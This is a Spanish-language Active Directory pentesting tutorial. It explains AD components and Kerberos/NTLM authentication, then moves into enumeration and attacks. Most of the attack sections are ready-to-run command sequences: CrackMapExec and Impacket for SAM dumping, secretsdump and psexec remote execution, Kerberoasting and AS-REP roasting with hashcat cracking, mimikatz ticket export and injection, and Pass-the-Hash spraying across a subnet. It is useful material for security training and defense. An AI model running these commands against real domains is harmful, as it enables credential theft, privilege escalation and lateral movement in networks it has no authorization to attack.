# Fundamentos de Active Directory

## ¿Qué es Active Directory?

```
Active Directory (AD) = Servicio de directorio de Microsoft

Usado por el 90% de organizaciones Fortune 1000

Funciones:
• Autenticación centralizada
• Gestión de usuarios y equipos
• Políticas de grupo (GPO)
• Permisos y accesos
• Recursos compartidos
```

---

## Componentes de AD

### **Domain**

```
Unidad básica de organización en AD

Ejemplo: ejemplo.com

Contiene:
• Usuarios
• Equipos
• Grupos
• Políticas
```

### **Domain Controller (DC)**

```
Servidor que ejecuta AD Domain Services

Funciones:
• Autenticación de usuarios
• Almacena base de datos de AD
• Replica información con otros DCs
• Aplica Group Policy Objects (GPO)

Por seguridad: Múltiples DCs por dominio
```

### **Forest**

```
Colección de uno o más dominios

ejemplo.com (root)
├── dev.ejemplo.com
├── prod.ejemplo.com
└── test.ejemplo.com

Comparten:
• Mismo esquema
• Mismo catálogo global
• Relaciones de confianza
```

---

## Objetos de AD

### **Usuarios**

```
Cuentas de personas o servicios

Atributos importantes:
• sAMAccountName (nombre de usuario)
• userPrincipalName (UPN)
• memberOf (grupos)
• servicePrincipalName (SPN) - para servicios

Ubicación: CN=Users,DC=ejemplo,DC=com
```

### **Grupos**

```
Colecciones de usuarios u objetos

Tipos:
• Security Groups (permisos)
• Distribution Groups (email)

Grupos importantes:
• Domain Admins
• Enterprise Admins
• Schema Admins
• Account Operators
```

### **Computers**

```
Cuentas de equipos unidos al dominio

Cada equipo = cuenta en AD
Nombre termina en $

Ejemplo: WORKSTATION01$
```

---

## Autenticación en AD

### **Kerberos**

```
Protocolo de autenticación por defecto

Puerto: 88/TCP

Componentes:
• KDC (Key Distribution Center) - En el DC
• TGT (Ticket Granting Ticket)
• TGS (Ticket Granting Service)
• Service Ticket

Flujo:
1. Usuario solicita TGT al KDC
2. KDC valida y envía TGT (cifrado con hash del usuario)
3. Usuario solicita TGS para servicio específico
4. KDC valida TGT y envía TGS
5. Usuario presenta TGS al servicio
6. Servicio valida y permite acceso
```

---

### **NTLM (NT LAN Manager)**

```
Protocolo legacy pero aún usado

Formato de hash:
Username:RID:LM-hash:NTLM-hash:::

Ejemplo:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Vulnerable a:
• Pass-the-Hash
• NTLM Relay
```

---

## Políticas de Grupo (GPO)

```
Group Policy Objects = Configuraciones aplicadas a usuarios/equipos

Ejemplos:
• Password policy
• Software deployment
• Scripts de inicio/apagado
• Configuración de firewall
• Restricciones de seguridad

Almacenadas en:
\\ejemplo.com\SYSVOL\ejemplo.com\Policies\
```

---

# Enumeración de AD

## Enumeración Sin Credenciales

### **Null Session (SMB)**

```bash
# Enum4linux
enum4linux -a 10.10.10.100

# SMBMap
smbmap -H 10.10.10.100 -u '' -p ''

# CrackMapExec
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

### **DNS**

```bash
# Enumerar DNS
nslookup -type=SRV _ldap._tcp.dc._msdcs.ejemplo.com

# Transferencia de zona
dig axfr ejemplo.com @10.10.10.100
```

---

## Enumeración Con Credenciales

### **LDAP**

```bash
# ldapsearch
ldapsearch -x -H ldap://10.10.10.100 -D "CN=user,CN=Users,DC=ejemplo,DC=com" -w 'password' -b "DC=ejemplo,DC=com"

# Buscar usuarios
ldapsearch -x -H ldap://10.10.10.100 -D "user@ejemplo.com" -w 'password' -b "DC=ejemplo,DC=com" "(objectClass=user)" sAMAccountName

# Buscar grupos
ldapsearch -x -H ldap://10.10.10.100 -D "user@ejemplo.com" -w 'password' -b "DC=ejemplo,DC=com" "(objectClass=group)"
```

---

### **PowerView (PowerShell)**

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Información del dominio
Get-Domain
Get-DomainController

# Usuarios
Get-DomainUser
Get-DomainUser -Identity administrator
Get-DomainUser -Properties samaccountname,description

# Grupos
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"

# Computers
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"

# GPOs
Get-DomainGPO

# OUs
Get-DomainOU

# ACLs
Get-DomainObjectAcl -Identity administrator

# Shares
Find-DomainShare

# Logged in users
Get-NetLoggedon -ComputerName DC01

# Sessions
Get-NetSession -ComputerName DC01

# SPNs (Service Principal Names)
Get-DomainUser -SPN

# Kerberoastable users
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

---

### **BloodHound (Inicial)**

```bash
# Recolectar datos con SharpHound
# Desde Windows con credenciales
.\SharpHound.exe -c All

# O con Python desde Kali
bloodhound-python -u usuario -p password -d ejemplo.com -dc dc01.ejemplo.com -c All

# Archivos generados: .json
# Subir a BloodHound para análisis visual
```

---

### **CrackMapExec**

```bash
# Verificar credenciales
crackmapexec smb 10.10.10.100 -u usuario -p password

# Enumerar shares
crackmapexec smb 10.10.10.100 -u usuario -p password --shares

# Enumerar usuarios
crackmapexec smb 10.10.10.100 -u usuario -p password --users

# Enumerar grupos
crackmapexec smb 10.10.10.100 -u usuario -p password --groups

# Password policy
crackmapexec smb 10.10.10.100 -u usuario -p password --pass-pol

# Logged users
crackmapexec smb 10.10.10.100 -u usuario -p password --loggedon-users

# Dump SAM
crackmapexec smb 10.10.10.100 -u usuario -p password --sam

# Ejecutar comando
crackmapexec smb 10.10.10.100 -u usuario -p password -x "whoami"
```

---

### **Impacket Tools**

```bash
# GetADUsers.py
impacket-GetADUsers ejemplo.com/usuario:password -all

# GetUserSPNs.py (Kerberoasting)
impacket-GetUserSPNs ejemplo.com/usuario:password

# GetNPUsers.py (AS-REP Roasting)
impacket-GetNPUsers ejemplo.com/usuario:password

# secretsdump.py
impacket-secretsdump ejemplo.com/usuario:password@10.10.10.100

# psexec.py
impacket-psexec ejemplo.com/usuario:password@10.10.10.100

# wmiexec.py
impacket-wmiexec ejemplo.com/usuario:password@10.10.10.100
```

---

# Ataques a Kerberos

## Kerberoasting

### **¿Qué es?**

```
Ataque para obtener hashes de cuentas de servicio con SPN

Flujo:
1. Usuario autenticado solicita TGS para servicio
2. TGS está cifrado con hash de la cuenta de servicio
3. Atacante extrae TGS
4. Crackea offline con hashcat/john

No requiere privilegios elevados
```

---

### **Ejecución**

```bash
# Con Impacket
impacket-GetUserSPNs ejemplo.com/usuario:password -request

# Output: Hashes TGS
$krb5tgs$23$*sqlservice$EJEMPLO.COM$...

# Guardar en archivo
impacket-GetUserSPNs ejemplo.com/usuario:password -request -outputfile hashes.txt

# Crackear con hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Con John the Ripper
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### **PowerShell (Desde Windows)**

```powershell
# Con PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Solicitar TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.ejemplo.com"

# Extraer tickets
mimikatz # kerberos::list /export

# Crackear offline
```

---

## AS-REP Roasting

### **¿Qué es?**

```
Ataque a usuarios con "Do not require Kerberos preauthentication"

Flujo:
1. Solicitar AS-REQ sin pre-autenticación
2. DC responde con AS-REP cifrado con hash del usuario
3. Extraer y crackear offline

No requiere credenciales válidas
```

---

### **Ejecución**

```bash
# Con Impacket (sin credenciales)
impacket-GetNPUsers ejemplo.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Con credenciales
impacket-GetNPUsers ejemplo.com/usuario:password -request

# Crackear
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---

### **PowerShell**

```powershell
# Con PowerView - Buscar usuarios vulnerables
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Desde Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

---

## Pass-the-Hash (PtH)

```bash
# Con CrackMapExec
crackmapexec smb 10.10.10.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Con Impacket psexec
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.100

# Con evil-winrm
evil-winrm -i 10.10.10.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Spray en red
crackmapexec smb 10.10.10.0/24 -u Administrator -H HASH --local-auth
```

---

## Pass-the-Ticket (PtT)

```bash
# Exportar tickets con Mimikatz
mimikatz # sekurlsa::tickets /export

# Inyectar ticket
mimikatz # kerberos::ptt ticket.kirbi

# Verificar
klist

# Desde Linux con Impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec ejemplo.com/usuario@target.ejemplo.com -k -no-pass
```